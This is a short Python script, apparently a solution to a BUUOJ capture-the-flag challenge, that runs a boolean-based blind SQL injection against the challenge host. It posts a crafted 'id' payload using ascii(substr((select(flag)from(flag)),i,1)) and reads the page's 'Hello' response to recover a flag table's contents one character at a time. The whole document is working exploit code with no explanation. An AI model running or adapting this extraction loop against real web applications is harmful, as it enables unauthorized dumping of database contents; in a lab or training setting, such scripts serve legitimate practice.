import requests
import time
from datetime import datetime

result=""
RF = 0
url="http://ce122f55-3942-442e-ada8-cdc8257d4e3a.node4.buuoj.cn:81"
st = time.time()
for i in range(1,60):
    if RF == 1:
        break
    for j in range(32,128):
        payload="0^if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,0)"%(i,j)
        data={"id":payload}
        r=requests.post(url,data)
        r.encoding=r.apparent_encoding
        if "Hello" in r.text:
            result+=chr(j)
            print("Fetched: " + result + " [%s]"%(datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
            break
        if "}" in result:
            RF = 1
            et = time.time()
            print(result,"\n[Elapsed Time] %fs"%(et - st))
            break